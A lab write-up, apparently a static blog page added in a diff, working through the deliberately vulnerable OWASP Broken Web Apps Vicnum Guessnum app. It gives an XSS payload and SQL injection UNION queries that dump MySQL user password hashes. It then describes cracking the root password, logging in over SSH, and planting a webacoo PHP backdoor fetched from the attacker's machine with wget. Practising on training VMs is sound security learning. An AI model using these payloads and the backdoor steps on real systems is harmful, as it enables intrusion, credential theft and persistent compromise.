@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+      <meta http-equiv="X-UA-Compatible" content="IE=edge">
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+      <!-- Enable responsiveness on mobile devices-->
+      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+
+      <title>m4l1c3.github.io</title>
+
+      
+        <link rel="alternate" type="application/atom+xml" title="RSS" href="https://m4l1c3.github.io/atom.xml">
+      
+
+      
+          <link rel="stylesheet" href="https://m4l1c3.github.io/site.css">
+      
+
+      
+      
+    </head>
+
+    <body class="hack dark main container">
+        
+    
+        
+                
+                    <header>
+                        <nav itemscope itemtype="http://schema.org/SiteNavigationElement">
+                        
+                            <a itemprop="url"
+                               class=""
+                               href="https:&#x2F;&#x2F;m4l1c3.github.io">
+                                <span itemprop="name">Home
+                                </span></a>
+                        
+                            <a itemprop="url"
+                               class=""
+                               href="https:&#x2F;&#x2F;m4l1c3.github.io&#x2F;categories">
+                                <span itemprop="name">Categories
+                                </span></a>
+                        
+                            <a itemprop="url"
+                               class=""
+                               href="https:&#x2F;&#x2F;m4l1c3.github.io&#x2F;tags">
+                                <span itemprop="name">Tags
+                                </span></a>
+                        
+                            <a itemprop="url"
+                               class=""
+                               href="https:&#x2F;&#x2F;m4l1c3.github.io&#x2F;atom.xml">
+                                <span itemprop="name">Feed
+                                </span></a>
+                        
+                        </nav>
+                    </header>
+                
+            
+    
+
+<article itemscope itemtype="http://schema.org/BlogPosting">
+    <header>
+        <h1 itemprop="headline">OWASP Broken Web Apps Vicnum - Guessnum</h1>
+        <span class="muted">
+    <svg style="margin-bottom:-3px" class="i-clock" viewBox="0 0 32 32"
+         width="16" height="16" fill="none" stroke="currentcolor"
+         stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
+        <circle cx="16" cy="16" r="14"/>
+        <path d="M16 8 L16 16 20 20"/>
+    </svg>
+    <span>2 minute read</span>
+    <svg style="margin-bottom: -3px" class="i-edit" viewBox="0 0 32 32"
+         width="16" height="16" fill="none" stroke="currentcolor"
+         stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
+        <path d="M30 7 L25 2 5 22 3 29 10 27 Z M21 6 L26 11 Z M5 22 L10 27 Z"/>
+    </svg>
+
+    Published: 2017-04-06
+</span>
+    </header>
+    <div itemprop="articleBody">
+      <p>I started off just playing the game to see what happens moving through the workflow.  After guessing the number in 8 tries I noticed that the count is being passed from the success page over to the scoreboard, using repeater to repeat with different parameters it turns out you can make up your own score by updating the paramter &amp;cnt.</p>
+<p>After letting Burp spider the site I saw a union page: union1.html seems like a sql union challenge..</p>
+<p>Looking at the page, the name parameter probably isn't sql injectable, but probably XSS vulnerable.</p>
+<p>Throwing:</p>
+<pre data-lang="javascript" class="language-javascript "><code class="language-javascript" data-lang="javascript">&lt;script&gt;alert(1)&lt;/script&gt;
+</code></pre>
+<p>into the URL for the unionguessname GET parameter worked.</p>
+<p>Now for the SQLi stuff.</p>
+<p>Doing a quick:</p>
+<pre data-lang="sql" class="language-sql "><code class="language-sql" data-lang="sql">' or 1 = 1 #
+</code></pre>
+<p>shows query results for all users on the page, so we know its injectable.</p>
+<p>Now to get the db users and their passwords:</p>
+<pre data-lang="sql" class="language-sql "><code class="language-sql" data-lang="sql">'  union all select user,password,3,4 from mysql.user#
+</code></pre>
+<p>Then with this I first tried crackstation.net, but wasn't able to get all the passwords for root, then I did a little research and it looks like the hashes are SHA1, after some searching I found this site: https://www.hashkiller.co.uk/ which found the root password in question: owaspbwa, this matches the readme when the VM boots up.</p>
+<p>Then just to see how to do it I grabbed the whole database through a web request in Burp:</p>
+<pre data-lang="sql" class="language-sql "><code class="language-sql" data-lang="sql">'  union all select table_schema, table_name,column_name,4 from information_schema.columns where table_schema != 'mysql' and table_schema != 'information_schema'#
+</code></pre>
+<p>Next lets ssh to the VM:</p>
+<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">ssh root@ip
+pw: owaspbwa
+</code></pre>
+<p>Now to get a persisted backdoor.</p>
+<p>I've been playing with parrot and it looks like it comes with a web backdoor named webacoo, after some researching, it looks pretty solid, now to set things up.</p>
+<p>First the backdoor has to be generated:</p>
+<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">webacoo -g -o bd.php
+</code></pre>
+<p>The -o option specifies to output to a file and the -g specifies to generate backdoor code, there is another option -f that allows control over what PHP function gets called to invoke the shell.</p>
+<p>Next fire up SimpleHTTPServer in Parrot and change directory to the web root /var/www on the VM and run:</p>
+<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">wget http://iptoparrot:8000/bd.php
+</code></pre>
+<p>Then to test things out:</p>
+<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">webacoo -t -u http://ip/bd.php
+</code></pre>
+
+    </div>
+
+    
+        <footer>
+            <hr>
+            <p>
+                
+                    Published by m4l1c3
+                
+                
+                    
+                    in <a href="https://m4l1c3.github.io/categories/vulnerable-web-app/">vulnerable-web-app</a>
+                
+                
+                    and tagged
+                    
+                        <a href="https://m4l1c3.github.io/tags/web/">web</a>
+                        
+                            
+                                
+                                    and
+                                
+                            
+                        
+                    
+                        <a href="https://m4l1c3.github.io/tags/owasp/">owasp</a>
+                        
+                            
+                        
+                    
+                
+            </p>
+            
+            
+        </footer>
+    
+</article>
+
+
+    </body>
+
+</html>
